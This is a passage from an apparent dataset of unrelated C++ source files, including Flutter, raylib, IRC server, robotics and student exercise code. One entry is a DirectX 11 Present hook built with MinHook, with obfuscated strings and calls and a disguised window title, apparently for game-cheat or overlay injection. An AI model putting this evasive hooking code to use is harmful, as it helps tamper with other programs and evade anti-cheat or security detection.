term::graphic::fg::setCol(61, 61, 70);\n    std::wcout << i+1;\n    term::graphic::fg::reset();\n    term::cursor::setHorizPos(2);\n    std::wcout << m_content[i] << std::endl;\n  }\n  term::cursor::restore();\n}\nstd::optional<std::wstring> Buf::getFilename() {\n  return m_filename;\n}\nstd::vector<std::wstring> &Buf::getContent() {\n  return m_content;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include <iostream>\nusing namespace std;\nusing std::cin;\nusing std::cout;\nusing std::endl;\n\n#define tab \"\\t\"\n\nvoid FillRand(int arr[], const int n);\nvoid Print(const int arr[], const int n);\nvoid Sort(int arr[], const int n);\nint Sum(const int arr[], const int n);\ndouble Avg(const int arr[], const int n);\nint minValueIn(const int arr[], const int n);\nint maxValueIn(const int arr[], const int n);\nvoid shiftLeft(int arr[], const int n, int shift);\nvoid shiftRight(int arr[], const int n, int shift);\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\tconst int n = 5;\n\tint arr[n];\n\tint originalArr[n];\n\tint shiftLeftValue, shiftRightValue;\n\tcout << \"\u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432:        \";\n\tFillRand(arr, n);\n\tcopy(arr, arr + n, originalArr);//\u041a\u043e\u043f\u0438\u044f \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u043d\u0443\u0436\u043d\u0430 \u0434\u043b\u044f \u0441\u0434\u0432\u0438\u0433\u0430 \n\tPrint(arr, n);                  //\u043e\u0440\u0438\u0433\u0438\u043d\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430, \u0430 \u043d\u0435 \u043e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e.\n\tcout << \"\u041e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432: \";\n\tSort(arr, n);\n\tPrint(arr, n);\n\tcout << \"\u0421\u0443\u043c\u043c\u0430 \u0447\u0438\u0441\u0435\u043b \" << Sum(arr, n) << endl;\n\tcout << \"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435: \" << Avg(arr, n) << endl;\n\tcout << \"\u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435: \" << minValueIn(arr, n) << endl;\n\tcout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435: \" << maxValueIn(arr, n) << endl;\n\t// \u0421\u0434\u0432\u0438\u0433 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0432\u043b\u0435\u0432\u043e \u043d\u0430 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0437\u0438\u0446\u0438\u0439\n\tcopy(originalArr, originalArr + n, arr); //\u041a\u043e\u043f\u0438\u044f \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u0433\u043e \u043c\u0430\u0441c\u0438\u0432\u0430\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0437\u0438\u0446\u0438\u0439 \u0434\u043b\u044f \u0441\u0434\u0432\u0438\u0433\u0430 \u0432\u043b\u0435\u0432\u043e: \";\n\tcin >> shiftLeftValue;\n\tPrint(arr, n);\n\tshiftLeft(arr, n, shiftLeftValue);\n\t// \u0421\u0434\u0432\u0438\u0433 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0432\u043f\u0440\u0430\u0432\u043e \u043d\u0430 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0437\u0438\u0446\u0438\u0439\n\tcopy(originalArr, originalArr + n, arr);//\u041a\u043e\u043f\u0438\u044f \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430\n\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0437\u0438\u0446\u0438\u0439 \u0434\u043b\u044f \u0441\u0434\u0432\u0438\u0433\u0430 \u0432\u043f\u0440\u0430\u0432\u043e: \";\n\tcin >> shiftRightValue;\n\tPrint(arr, n);\n\tshiftRight(arr, n, shiftRightValue);\n}\n\nvoid FillRand(int arr[], const int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tarr[i] = rand() % 100;\n\t}\n}\nvoid Print(const int arr[], const int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << arr[i] << tab;\n\t}\n\tcout << endl;\n}\nvoid Sort(int arr[], const int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = i + 1; j < n; j++)\n\t\t{\n\t\t\tif (arr[j] < arr[i])\n\t\t\t{\n\t\t\t\tint buffer = arr[i];\n\t\t\t\tarr[i] = arr[j];\n\t\t\t\tarr[j] = buffer;\n\t\t\t}\n\t\t}\n\t}\n}\nint Sum(const int arr[], const int n)\n{\n    int sum = 0;\n    for (int i = 0; i < n; i++)\n    {\n        sum += arr[i];\n    }\n    return sum;\n}\ndouble Avg(const int arr[], const int n)\n{\n    return (double)Sum(arr, n) / n;\n}\nint minValueIn(const int arr[], const int n)\n{\n    int minVal = arr[0];\n    for (int i = 1; i < n; i++)\n    {\n        if (arr[i] < minVal)\n        {\n            minVal = arr[i];\n        }\n    }\n    return minVal;\n}\nint maxValueIn(const int arr[], const int n)\n{\n    int maxVal = arr[0];\n    for (int i = 1; i < n; i++)\n    {\n        if (arr[i] > maxVal)\n        {\n            maxVal = arr[i];\n        }\n    }\n    return maxVal;\n}\nvoid shiftLeft(int arr[], const int n, int shift)\n{\n\tfor (int i = 0; i < shift; i++)\n\t{\n\t\tint buffer = arr[0];\n\t\tfor (int i = 1; i < n; i++)\n\t\t{\n\t\t\tarr[i - 1] = arr[i];\n\t\t}\n\t\tarr[n - 1] = buffer;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcout << arr[i] << tab;\n\t\t}\n\t\tcout << endl;\n\t}\n}\nvoid shiftRight(int arr[], const int n, int shift)\n{\n\tfor (int i = 0; i < shift; i++)\n\t{\n\t\tdouble buffer = arr[n - 1];\n\t\tfor (int i = n - 1; i > 0; i--)\n\t\t{\n\t\t\tarr[i] = arr[i - 1];\n\t\t}\n\t\tarr[0] = buffer;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcout << arr[i] << tab;\n\t\t}\n\t\tcout << endl;\n\t}\n}",
    "/*******************************************************************************************\n*\n*   raylib [textures] example - Retrieve image data from texture: LoadImageFromTexture()\n*\n*   NOTE: Images are loaded in CPU memory (RAM); textures are loaded in GPU memory (VRAM)\n*\n*   Example originally created with raylib 1.3, last time updated with raylib 4.0\n*\n*   Example licensed under an unmodified zlib/libpng license, which is an OSI-certified,\n*   BSD-like license that allows static linking with closed source software\n*\n*   Copyright (c) 2015-2024 Ramon Santamaria (@raysan5)\n*\n********************************************************************************************/\n\n#include \"raylib.h\"\n\n//------------------------------------------------------------------------------------\n// Program main entry point\n//------------------------------------------------------------------------------------\nint main(void)\n{\n    // Initialization\n    //--------------------------------------------------------------------------------------\n    const int screenWidth = 800;\n    const int screenHeight = 450;\n\n    InitWindow(screenWidth, screenHeight, \"raylib [textures] example - texture to image\");\n\n    // NOTE: Textures MUST be loaded after Window initialization (OpenGL context is required)\n\n    Image image = LoadImage(\"assets/raylib_logo.png\");  // Load image data into CPU memory (RAM)\n    Texture2D texture = LoadTextureFromImage(image);       // Image converted to texture, GPU memory (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload image data from CPU memory (RAM)\n\n\n    image = LoadImageFromTexture(texture);                 // Load image from GPU texture (VRAM -> RAM)\n    UnloadTexture(texture);                                // Unload texture from GPU memory (VRAM)\n\n    texture = LoadTextureFromImage(image);                 // Recreate texture from retrieved image data (RAM -> VRAM)\n    UnloadImage(image);                                    // Unload retrieved image data from CPU memory (RAM)\n    //---------------------------------------------------------------------------------------\n\n    // Main game loop\n    while (!WindowShouldClose())    // Detect window close button or ESC key\n    {\n        // Update\n        //----------------------------------------------------------------------------------\n        // TODO: Update your variables here\n        //----------------------------------------------------------------------------------\n\n        // Draw\n        //----------------------------------------------------------------------------------\n        BeginDrawing();\n\n            ClearBackground(RAYWHITE);\n\n            DrawTexture(texture, screenWidth/2 - texture.width/2, screenHeight/2 - texture.height/2, WHITE);\n\n            DrawText(\"this IS a texture loaded from an image!\", 300, 370, 10, GRAY);\n\n        EndDrawing();\n        //----------------------------------------------------------------------------------\n    }\n\n    // De-Initialization\n    //--------------------------------------------------------------------------------------\n    UnloadTexture(texture);       // Texture unloading\n\n    CloseWindow();                // Close window and OpenGL context\n    //--------------------------------------------------------------------------------------\n\n    return 0;\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Channel.cpp                                        :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: acarlott <acarlott@student.42lyon.fr>      +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/04/12 14:57:26 by acarlott          #+#    #+#             */\n/*   Updated: 2024/04/19 12:29:11 by acarlott         ###   ########lyon.fr   */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Channel.hpp\"\n#include \"Server.hpp\"\n\n// ----- Class clientInfos (used by channel and only channel) ----- //\n\nClientInfos::ClientInfos(Client *clientPtr, bool isOperator): _client(clientPtr), _isOperator(isOperator) {}\n\nconst bool& ClientInfos::getIsOperator(void) const { return this->_isOperator; }\n\nvoid ClientInfos::setIsOperator(bool isOperator) { this->_isOperator = isOperator; }\n\nconst Client* ClientInfos::getClient(void) const { return this->_client; }\n\n// ----- Class Channel ----- //\n\nChannel::Channel(std::string channelName, Client* clientPtr): _hasUsersLimit(false), _hasPassword(false), _isOnInvite(false), _isTopicOperatorMode(true) ,_channelName(channelName), _password(\"\"), _topic(\"\")\n{\n    this->_clientsDataMap.insert(std::make_pair(clientPtr->getNickName(), new ClientInfos(clientPtr, true)));\n    sendMessage(clientPtr->getClientFd(), JOIN_SUCCESS);\n    sendMessage(clientPtr->getClientFd(), JOIN_NAMERPLY);\n\tsendMessage(clientPtr->getClientFd(), JOIN_ENDOFNAMES);\n}\n\nChannel::~Channel(void) {\n    for (clientsMap::iterator clientIt = this->_clientsDataMap.begin(); clientIt != this->_clientsDataMap.end(); clientIt++)\n        delete (clientIt->second);\n    this->_clientsDataMap.clear();\n}\n\n// METHODS\n\nvoid    Channel::addClient(Client *clientPtr, std::string password)\n{\n\tif (this->_hasPassword && this->_password != password) {\n\t\tsendMessage(clientPtr->getClientFd(), ERR_BADCHANNELKEY(this->_channelName));\n\t\treturn ;\n\t}\n\tif (this->_isOnInvite && std::find(this->_invitedVector.begin(), this->_invitedVector.end(), clientPtr->getNickName()) == this->_invitedVector.end()) {\n\t\tsendMessage(clientPtr->getClientFd(), ERR_INVITEONLYCHAN(this->_channelName));\n\t\treturn ;\n\t}\n\tif (this->_hasUsersLimit && this->_clientsDataMap.size() >= this->_usersLimit) {\n\t\tsendMessage(clientPtr->getClientFd(), ERR_CHANNELISFULL(this->_channelName));\n\t\treturn ;\n\t}\n\n\tthis->_clientsDataMap.insert(std::make_pair(clientPtr->getNickName(), new ClientInfos(clientPtr, false)));\n\tfor (clientsMap::iterator it = this->_clientsDataMap.begin(); it != this->_clientsDataMap.end(); it++) {\n\t\tsendMessage(it->second->getClient()->getClientFd(), JOIN_SUCCESS);\n\t}\n\tif (this->_topic != \"\") {\n\t\tsendMessage(clientPtr->getClientFd(), RPL_TOPIC(this->_channelName, this->_topic));\n\t\tsendMessage(clientPtr->getClientFd(), RPL_TOPICWHOTIME(this->_channelName, this->topicAuth, this->topicTime));\n\t}\n\tsendMessage(clientPtr->getClientFd(), JOIN_NAMERPLY);\n\tsendMessage(clientPtr->getClientFd(), JOIN_ENDOFNAMES);\n}\n\nbool    Channel::removeClient(std::string nickname)\n{\n\tclientsMapIterator it = this->_clientsDataMap.find(nickname);\n\tif (it != this->_clientsDataMap.end()) {\n\t\tdelete it->second;\n\t\tthis->_clientsDataMap.erase(it);\n\t}\n\treturn this->_clientsDataMap.empty();\n}\n\n// For nick command\n\nvoid        Channel::changeChannelClientNick(std::string oldNick, std::string newNick)\n{\n    clientsMap::iterator  clientIt;\n\n    clientIt = this->_clientsDataMap.find(oldNick);\n    if (clientIt != this->_clientsDataMap.end()) {\n        this->_clientsDataMap.insert(std::make_pair(newNick, clientIt->second));\n        this->_clientsDataMap.erase(oldNick);\n    }\n}\n\nvoid        Channel::changeInvitedClientNick(std::string oldNick, std::string newNick)\n{\n    std::vector<std::string>::iterator  clientIt;\n\n    clientIt = std::find(this->_invitedVector.begin(), this->_invitedVector.end(), oldNick);\n    if (clientIt != this->_invitedVector.end()) {\n        this->_invitedVector.erase(clientIt);\n        this->_invitedVector.push_back(newNick);\n    }\n}\n\n// For privmsg command\n\nvoid        Channel::privmsg(std::vector<std::string> cmd, Client* clientPtr)\n{\n\tstd::string message;\n\n\tfor (size_t i = 2; i < cmd.size(); i++) {\n\t\tmessage += cmd[i];\n\t\tif (i + 1 != cmd.size())\n\t\t\tmessage += \" \";\n\t}\n    for (clientsMap::iterator it = this->_clientsDataMap.begin(); it != this->_clientsDataMap.end(); it++) {\n        if (it->second->getClient() != clientPtr)\n            sendMessage(it->second->getClient()->getClientFd(), \":\" + clientPtr->getNickName() + \" PRIVMSG \" + this->_channelName + \" \" + message);\n    }\n}\n\n// For ",
    "/*----------------------------------------------------------------------------*/\n/*                                                                            */\n/*    Module:       main.cpp                                                  */\n/*    Author:       jokin                                                     */\n/*    Created:      1/25/2024, 6:54:56 PM                                     */\n/*    Description:  V5 project                                                */                                      \n/*----------------------------------------------------------------------------*/\n\n#include \"math.h\"\n#include \"vex.h\"\n#include <string>\n\nusing namespace vex;\n\n// A global instance of competition\ncompetition Competition;\n\ncontroller Con;\nbrain Brn;\n\nmotor frontLeftDrive = motor(PORT11, ratio18_1);\nmotor middleLeftDrive = motor(PORT2, ratio18_1);\nmotor backLeftDrive = motor(PORT12, ratio18_1);\nmotor frontRightDrive = motor(PORT13, ratio18_1);\nmotor middleRightDrive = motor(PORT15, ratio18_1);\nmotor backRightDrive = motor(PORT14, ratio18_1);\nmotor lowerSpinnyThing = motor(PORT3, ratio6_1);\nmotor upperspinnyThing = motor(PORT4, ratio6_1);\nmotor claw = motor(PORT20, ratio18_1);\nmotor leftWing = motor(PORT1, ratio18_1);\nmotor rightWing = motor(PORT10, ratio18_1);\nmotor intake = motor(PORT17, ratio6_1);\n\n// ALLIANCES: 0 = BlUE 1 = RED\nbool fast = true, skills = false, leftDown = false, rightDown = false, R2pressingons = false;;\ndouble leftDriveVel = 0, rightDriveVel = 0, alliance = 0;\nstd::string screen = \"main\", auton = \"red2\";\nint p1dist = 0, p1vel = 75, x, clawvelABS = claw.velocity(percent);\n\nvoid drawRectangle(int x, int y, int w, int h, std::string autonSelected) {\n    // Draw the square\n    Brn.Screen.drawRectangle(x, y, w, h);\n\n    // Check if the square is pressed (selected)\n    if (Brn.Screen.pressing()) {\n        int touchX = Brn.Screen.xPosition();\n        int touchY = Brn.Screen.yPosition();\n        if (touchX >= x && touchX <= x + w && touchY >= y && touchY <= y + h) {\n            // Change the value of the auton variable when the square is selected\n            auton = autonSelected;\n        }\n    }\n}\n\nvoid drawButton(int x, int y, int w, int h, std::string t, std::string destination) {\n        Brn.Screen.setFillColor(black);\n        Brn.Screen.setPenWidth(1);     \n      Brn.Screen.setPenColor(white);\n    Brn.Screen.drawRectangle(x, y, w, h);\n    int textWidth = Brn.Screen.getStringWidth(t.c_str());\n    int textX = x + (w - textWidth) / 2;\n    int textY = y + h / 2;\n    Brn.Screen.setCursor(1, 1);\n    Brn.Screen.printAt(textX, textY, false, t.c_str());\n\n    // Check if button is pressed\n    if (Brn.Screen.pressing()) {\n        int touchX = Brn.Screen.xPosition();\n        int touchY = Brn.Screen.yPosition();\n        if (touchX >= x && touchX <= x + w && touchY >= y && touchY <= y + h) {\n            screen = destination;\n        }\n    }\n}\n\nvoid UI() {\n    if (screen != \"main\") {\n      Brn.Screen.setPenWidth(1);     \n       Brn.Screen.setFillColor(black);\n      Brn.Screen.setPenColor(white);\n      drawButton(429, 205, 50, 35, \"Back\", \"main\");\n    }\n    if(screen == \"main\"){\n      Brn.Screen.setPenWidth(1);\n            Brn.Screen.setFillColor(black);\n      Brn.Screen.setPenColor(white);\n    drawButton(0, 0, 159, 119, \"Auton Selector\", \"auton\");\n    drawButton(0, 119, 159, 119, \"Motor Temps\", \"temps\");\n    }\n    else if(screen == \"temps\"){\n      Brn.Screen.setPenWidth(1);\n      Brn.Screen.setFillColor(black);\n      Brn.Screen.setPenColor(white);\n      Brn.Screen.setFont(mono40);\n      Brn.Screen.setCursor(1, 1);\n      Brn.Screen.print(\"Motor Temps (Celcius): \");\n      Brn.Screen.setFont(mono20);\n      Brn.Screen.setCursor(3,1);\n      Brn.Screen.print(\"Front Left Drive: \");\n      Brn.Screen.print(frontLeftDrive.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n      Brn.Screen.setCursor(4,1);\n      Brn.Screen.print(\"Middle Left Drive: \");\n      Brn.Screen.print(middleLeftDrive.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n      Brn.Screen.setCursor(5,1);\n      Brn.Screen.print(\"Back Left Drive: \");\n      Brn.Screen.print(backLeftDrive.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n      Brn.Screen.setCursor(6,1);\n      Brn.Screen.print(\"Front Right Drive: \");\n      Brn.Screen.print(frontRightDrive.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n      Brn.Screen.setCursor(7,1);\n      Brn.Screen.print(\"Middle Right Drive: \");\n      Brn.Screen.print(middleRightDrive.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n      Brn.Screen.setCursor(8,1);\n      Brn.Screen.print(\"Back Right Drive: \");\n      Brn.Screen.print(backRightDrive.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n      Brn.Screen.setCursor(9,1);\n      Brn.Screen.print(\"intake: \");\n      Brn.Screen.print(intake.temperature(celsius));\n      Brn.Screen.print(\"\u00b0\");\n    }\n    else if(screen == \"auton\"){\n      Brn.Screen.setPenWidth(1);\n      Brn.Screen.setFillColor(black);\n      Brn.Screen.printAt(199, 53, \"Blue Go",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <limits> \n\nusing namespace std;\nconst int days = 7;\nconst int meals = 3;\nstring daysOfWeek[days] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\nstruct Recipe\n{\n    vector<string> recipe;\n    int m = 0;\n};\n\nRecipe add_line_in_vector(const string &line)\n{\n    Recipe recipe;\n    stringstream get(line);\n    string temp;\n    while (getline(get, temp, ','))\n    {\n        if (temp != \"directions\")\n        {\n            recipe.m++; // Count the number of ingredients\n        }\n        else\n        {\n            // Stop parsing ingredients when \"directions\" is encountered\n        }\n        recipe.recipe.push_back(temp);\n    }\n    return recipe;\n}\nvoid diabetes_eatable_checker(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        